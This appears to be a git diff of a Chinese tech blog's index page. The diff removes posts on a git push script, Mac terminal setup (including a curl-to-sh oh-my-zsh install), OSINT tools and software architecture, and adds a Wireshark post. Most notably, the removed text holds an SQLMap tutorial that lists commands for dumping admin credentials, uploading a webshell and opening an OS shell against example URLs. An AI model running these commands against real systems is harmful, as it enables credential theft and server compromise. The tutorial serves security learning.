-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数：显示使用说明</span></span><br><span class="line"><span class="function"><span class="title">show_help</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: ./update.sh [options]&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;This script updates file timestamps, stages changes, commits them to Git,&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;and pushes to the specified branch.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Options:&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -h, --help          Show this help message and exit.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -c, --commit &lt;msg&gt;  Git commit message (default: &#x27;update&#x27;).&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -b, --branch &lt;name&gt; Git branch name (default: &#x27;main&#x27;).&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -f, --force         Force add all changes (including untracked files).&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认设置</span></span><br><span class="line">commit_message=<span class="string">&quot;update&quot;</span></span><br><span class="line">branch_name=<span class="string">&quot;main&quot;</span></span><br><span class="line">force_add=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析参数</span></span><br><span class="line"><span class="keyword">while</span> [[ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> != <span class="string">&quot;&quot;</span> ]]; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">        -h | --<span class="built_in">help</span> )</span><br><span class="line">            show_help</span><br><span class="line">            <span class="built_in">exit</span> 0</span><br><span class="line">            ;;</span><br><span class="line">        -c | --commit )</span><br><span class="line">            <span class="built_in">shift</span></span><br><span class="line">            commit_message=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">            ;;</span><br><span class="line">        -b | --branch )</span><br><span class="line">            <span class="built_in">shift</span></span><br><span class="line">            branch_name=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">            ;;</span><br><span class="line">        -f | --force )</span><br><span class="line">            force_add=<span class="literal">true</span></span><br><span class="line">            ;;</span><br><span class="line">        * )</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Unknown option: <span class="variable">$1</span>&quot;</span></span><br><span class="line">            show_help</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">            ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加文件到 Git</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">$force_add</span>; <span class="keyword">then</span></span><br><span class="line">    git add -A  <span class="comment"># 强制添加所有变化，包括未追踪的文件</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    git add .   <span class="comment"># 仅添加已追踪的文件的变化</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交变更并使用指定的提交信息</span></span><br><span class="line">git commit -m <span class="string">&quot;<span class="variable">$commit_message</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到指定的远程分支</span></span><br><span class="line">git push origin <span class="string">&quot;<span class="variable">$branch_name</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Mac-终端优化-（iTerm2-oh-my-zsh-powerlevel10k"><a href="#Mac-终端优化-（iTerm2-oh-my-zsh-powerlevel10k" class="headerlink" title="Mac 终端优化 （iTerm2 + oh my zsh + powerlevel10k)"></a>Mac 终端优化 （iTerm2 + oh my zsh + powerlevel10k)</h3><h4 id="安装-iTerm2-terminal的优化"><a href="#安装-iTerm2-terminal的优化" class="headerlink" title="安装 iTerm2 -&gt; terminal的优化"></a>安装 <em><strong>iTerm2</strong></em> -&gt; terminal的优化</h4><p><a target="_blank" rel="noopener" href="https://iterm2.com/">iTerm2</a></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1757146">iTerm2 - 解决文本复制不了问题</a></p>
-<h4 id="安装-oh-my-zsh-zsh的优化"><a href="#安装-oh-my-zsh-zsh的优化" class="headerlink" title="安装 oh my zsh -&gt; zsh的优化"></a>安装 <em><strong>oh my zsh</strong></em> -&gt; zsh的优化</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2303773">Oh-my-zsh主题乱码解决办法</a></p>
-<h4 id="安装-powerlevel10k-主题"><a href="#安装-powerlevel10k-主题" class="headerlink" title="安装 powerlevel10k 主题"></a>安装 <em><strong>powerlevel10k</strong></em> 主题</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$ZSH_CUSTOM</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment">## 或者</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ./.oh-my-zsh/themes</span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/romkatv/powerlevel10k.git</span><br></pre></td></tr></table></figure>
-
-<p>vi ~&#x2F;.zshrc 设置如下内容 使用p10k主题 ZSH_THEME&#x3D;”powerlevel10k&#x2F;powerlevel10k”</p>
-<h4 id="安装语法高亮插件和自动补全插件"><a href="#安装语法高亮插件和自动补全插件" class="headerlink" title="安装语法高亮插件和自动补全插件"></a>安装语法高亮插件和自动补全插件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.oh-my-zsh/custom/plugins/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
-
-<p>vi ~&#x2F;.zshrc 在插件配置处添加下载的这两个插件名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">     git</span><br><span class="line">     zsh-syntax-highlighting</span><br><span class="line">     zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<h3 id="重新选择风格"><a href="#重新选择风格" class="headerlink" title="重新选择风格"></a>重新选择风格</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure>
 
         </div>
     
@@ -493,169 +568,8 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/social-engineering/">
-                社工库工具
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/渗透/">渗透</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>国外情报专家最常用的OSINT工具</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/guchangan1/All-Defense-Tool?tab=readme-ov-file#%E7%A4%BE%E5%B7%A5%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%B1%BB">a</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.topgoer.cn/docs/offensive/offensive-1e1ht41abkse7">b</a></p>
-<ul>
-<li><em><strong>Sherlock</strong></em> 是社交媒体账户追踪（爬虫）工具，可用于收集有关人员的信息，对记者和安全研究人员特别有用</li>
-</ul>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/software-structure/">
-                软件架构演变
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/架构/">架构</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h2 id="前端了解"><a href="#前端了解" class="headerlink" title="前端了解"></a>前端了解</h2><p>浏览器基本内核：</p>
-<ul>
-<li>IE(7,8,9,10 这几个版本难以兼容) -&gt; Trident内核 （目前淘汰）</li>
-<li>Chrome: Webkit内核 -&gt; Blink内核</li>
-<li>火狐: Gecko内核</li>
-<li>Safari: Webkit内核</li>
-<li>Opera: Presto -&gt; Webkit内核 -&gt; Blink内核</li>
-</ul>
-<h2 id="单体架构"><a href="#单体架构" class="headerlink" title="单体架构"></a>单体架构</h2><p>在单体架构的体系内，对象关系映射（ORM）框架是一个至关重要的组件，其主要功能在于抽象化和简化数据库的增删改查（CRUD）操作。ORM通过封装底层数据库操作的复杂性，显著提升了数据访问层的开发效率。ORM框架的核心功能在于将关系型数据库中的数据模型转换为应用程序中的对象模型，实现了数据访问的抽象化。此种映射机制有效地减少了开发者在进行数据库交互时所需编写的代码量，从而使得开发人员能够将更多的精力投入到业务逻辑的实现上，而非数据访问的具体技术细节。</p>
-<p><img src="/images/single-software-structure.png"></p>
-<p><em><strong>优点:</strong></em></p>
-<ul>
-<li>开发的便捷性、部署的简洁性以及相对易于管理的横向扩展能力</li>
-<li>开发人员能够在一个统一的代码库中进行快速的迭代和调试，从而加速了开发进程</li>
-</ul>
-<p><em><strong>缺点:</strong></em></p>
-<ul>
-<li>系统的任何微小改动都可能触发对整个应用程序的重新部署，这不仅加剧了维护工作的复杂性，也提高了系统潜在的错误风险</li>
-<li>单体架构在处理大规模用户或数据时，其横向扩展能力受到限制，性能瓶颈成为一个显著问题</li>
-</ul>
-<p><em><strong>基本框架：</strong></em></p>
-<ul>
-<li>前端 - angular jq 模版引擎ecshop(smart)</li>
-<li>后台 - Java(spring mvc, Struts2) PHP(Yii2 zendFramework2, thinkphp3.2)</li>
-</ul>
-<h2 id="多层架构"><a href="#多层架构" class="headerlink" title="多层架构"></a>多层架构</h2><p>应用程序被细分为多个层次，主要包括表现层（用户界面）、业务逻辑层和数据访问层，这一模式通常被称作模型-视图-控制器（MVC）。这种分层的设计方法允许每一层独立进行开发和测试，从而显著提升了代码的可管理性和可维护性。</p>
-<p>多层架构的设计理念体现了专业领域分工的细化，即所谓的垂直领域专业化。它是社会分工精细化趋势在软件开发领域的体现。在这种架构中，前后端的分离正是一种垂直拆分的实践，而MVC本身也是垂直架构的一个典型示例。</p>
-<p><img src="/images/mult-software-structure.png"></p>
-<p><em><strong>优点:</strong></em></p>
-<ul>
-<li>尽管层与层之间的耦合较单体架构有所减少<br><em><strong>缺点:</strong></em></li>
-<li>某一层的变更仍有可能引发连锁反应，影响到其他层的稳定性和功能。</li>
-</ul>
-<p>一般会采用敏捷开发杜绝此类现象，产品周期性迭代<br>逐渐有了devops的概念</p>
-<h3 id="读写分离的数据库架构"><a href="#读写分离的数据库架构" class="headerlink" title="读写分离的数据库架构"></a>读写分离的数据库架构</h3><p><img src="/images/rw-software-structure.png"></p>
-<p><em><strong>原因：</strong></em><br>公司又增加了很多新的业务，系统也增加了更多的功能。预定蔬菜的商户也可以通过手机查看历史订单和各种统计信息了，即使怎么增加应用服务器，也会出现用户需要等待很长的时间，最终数据库也出现了瓶颈。</p>
-<p><em><strong>解决方案：读写分离</strong></em><br>数据库是分布式架构中最难的问题，因为不像应用服务器是不保存数据的。如果想要增加数据库服务器的数量，那么首先需要解决数据重复和一致性的问题。现实中对应的方案有很多，例如读写分离、数据库物理分区、逻辑分表、逻辑分库，但本质上讲只是拆分数据库操作的方式不同而已，而我们应对数据库性能最常用和性价比最高的方式是读写分离</p>
-<p>有了锁的概念 读写锁 乐观锁 悲观锁 </p>
-<h3 id="用消息队列的架构"><a href="#用消息队列的架构" class="headerlink" title="用消息队列的架构"></a>用消息队列的架构</h3><p><img src="/images/rw-cache-software-structure.png"></p>
-<p><em><strong>原因：</strong></em><br>相应的系统中往往存在这种类似的场景，当我们视频网站上传了一条视频后，视频网站往往会进行转码以便适合网络播放，这种操作需要耗费大量的服务器资源，不可能实时的在用户点击提交后处理完毕，否则用户需要等待很久，甚至连接超时。</p>
-<p><em><strong>解决方案：消息队列</strong></em><br>我们可以让此类任务不必是实时完成的。当用户提交请求后，系统会把任务添加到消息队列中，完成之后改变数据的状态，用户在刷新或接到通知后知道任务已经处理完毕。<br>随着业务的发展，公司开始向新的领域扩张，开发了拓展更多商户的代理平台和物流平台，甚至需要和和第三方平台对接，而且需要保证这些平台中一些通用的数据和逻辑是一致的。</p>
-<h3 id="过度阶段-面向服务的架构SOA"><a href="#过度阶段-面向服务的架构SOA" class="headerlink" title="过度阶段 面向服务的架构SOA"></a>过度阶段 面向服务的架构SOA</h3><p><em><strong>原因：</strong></em><br>软件系统变得越来越复杂，参与的开发者就越多，应用系统的分离和分化就变得很有意义了。面向前端的API应用服务器不再真正的处理业务逻辑而是调用专门的服务器来完成。</p>
-<p>单点登录（SSO）是一个典型的面向服务的架构，在互联网公司中被广泛使用。国内互联网巨头往往拥有多个系统，例如腾讯的QQ音乐、空间都可以使用同一个QQ号登陆。于是用户服务和认证服务被剥离开来，各个系统之间通过统一登录和管理用户信息，用户的体验得到了极大的提升，这就是面向服务架构的一个例子。</p>
-<p><img src="/images/SSO-software-structure.png"></p>
-<p>这些大厂不仅在自己的系统内完成了统一的认证和用户管理，并且把登录、授权的服务开放给第三方系统。例如很多网站支持微信登录，这样用户就可以使用一套用户名密码登录大量接入的系统。并且业界有一个通用规范，便于各种系接入，这就是OAuth标准。</p>
-<p><img src="/images/OAuth-software-structure.png"></p>
-<p>通过面向服务的架构改造，系统中分化出了用户服务、物流服务、订单服务等服务，通过OAuth的方式提供了收银机系统认证对接。一些收银机厂商也对接了这个系统，商户可以通过支持的收银设备进行下食材的预定操作了。</p>
-<h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>微服务架构（Microservices Architecture）的兴起源于对传统应用架构的局限性的突破。随着信息技术和互联网的快速发展，企业对于应用的扩展性、可靠性和维护性提出了更高的要求。传统应用架构由于其整体性和复杂性，逐渐难以满足这些需求。在这样的背景下，微服务架构应运而生，以其独特的优势，逐渐成为分布式系统设计的主流架构之一。</p>
-<p>微服务架构是一种分布式系统架构，其核心思想是将一个复杂的应用分解为一组相互协作的微小服务。每个微服务都是独立的业务单元，运行在自己的进程中，并通过轻量级的通信机制（如HTTP RESTful API）相互协作。这些服务围绕业务功能构建，每个服务都有自己的业务逻辑和数据存储，可以独立部署和扩展。</p>
-<p><img src="/images/micro-software-structure.png"></p>
-<p>不同应用和数据之间互相依赖，逻辑纠缠不清，项目的部署进入了混沌状态，对于大型、依赖关系复杂的系统需要一个更为有力的架构。为了解决系统复杂性和服务解耦的问题，这时候该微服务和领域驱动建模（DDD）出场了。</p>
-<p>将不同职责的服务独立部署，从而实现服务内部高内聚，服务之间低耦合的效果，让开发变得更为灵活。当然“分开是为了更好的在一起”，为了重新组合和稳定运行这些服务，人们发明了服务发现、熔断机制、服务部署监控等一篮子工具。</p>
-<p>优点:</p>
-<ul>
-<li>它通过模块化提高了系统的可维护性和可扩展性。每个微服务都是独立的模块，可以单独开发和部署，不会影响到其他服务。</li>
-<li>微服务架构通过服务之间的松耦合，提高了系统的可靠性</li>
-<li>每个服务都有自己的数据存储，避免了单点故障的风险。此外，微服务架构支持技术多样性，每个服务都可以选择最适合其业务需求的技术栈，从而充分发挥各种技术的优势。</li>
-</ul>
-<p>缺点: </p>
-<ul>
-<li>相较于传统应用架构，微服务架构更为复杂，需要更多的管理和协调工作。管理难度大</li>
-<li>微服务架构需要更多的工作量来设计、开发、测试、部署和管理多个小型服务，这增加了开发团队的负担 成本高</li>
-</ul>
-<h2 id="边缘计算架构"><a href="#边缘计算架构" class="headerlink" title="边缘计算架构"></a>边缘计算架构</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7368505674224238607">引用</a><br><a target="_blank" rel="noopener" href="https://shaogefenhao.com/posts/architecture/roamap-of-system.html#%E9%9D%A2%E5%90%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%9E%B6%E6%9E%84-soa">引用</a></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/springboot/">
-                Springboot
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/后端/">后端</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>文章</p>
-<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="微服务-dubbo-zookeeper"><a href="#微服务-dubbo-zookeeper" class="headerlink" title="微服务 dubbo - zookeeper"></a>微服务 dubbo - zookeeper</h2><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="undertow-对比-tomcat"><a href="#undertow-对比-tomcat" class="headerlink" title="undertow 对比 tomcat"></a>undertow 对比 tomcat</h3>
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/sqlmap/">
-                SQLMap
+            <a href="/2026/09/19/wireshark/">
+                Wireshark
             </a>
         </h1>
         <div class="post-info">
@@ -673,654 +587,9 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     
         <div class="content">
-            <p>文章</p>
-<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="分类文章"><a href="#分类文章" class="headerlink" title="分类文章"></a>分类文章</h3><h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	http://www.vuln.cn/1992<br />
-</h3>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	sqlmap简介
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap支持五种不同的注入模式：
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		4、联合查询注入，可以使用union的情况下的注入。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		5、堆查询注入，可以同时执行多条语句的执行时的注入。
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	sqlmap支持的数据库有
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
-</p>
-<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	检测注入
-</h2>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	基本格式
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1"
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	默认使用level1检测全部数据库类型
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	跟随302跳转
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br />
-当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br />
-目的就是：要追踪到错误信息。
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	cookie注入
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	当程序有防get注入的时候，可以使用cookie注入<br />
-sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	从post数据包中注入
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	可以使用burpsuite或者temperdata等工具来抓取post包
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql &nbsp; &nbsp;指定username参数
-</p>
-<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	注入成功后
-</h2>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	获取数据库基本信息
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 --dbs
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	查询有哪些数据库
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test --tables
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	查询test数据库中有哪些表
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin --columns
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	查询test数据库中admin表有哪些字段
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin -C "username,password" --dump
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	dump出字段username与password中的数据
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	其他命令参考下面
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	从数据库中搜索字段
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password<br />
-在dedecms数据库中搜索字段admin或者password。
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	读取与写入文件
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	首先找需要网站的物理路径，其次需要有可写或可读权限。
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br />
---file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br />
---file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br />
-#示例：<br />
-sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	使用shell命令：
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell<br />
-接下来指定网站可写目录：<br />
-“E:\php\htdocs\dvwa”
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
-</p>
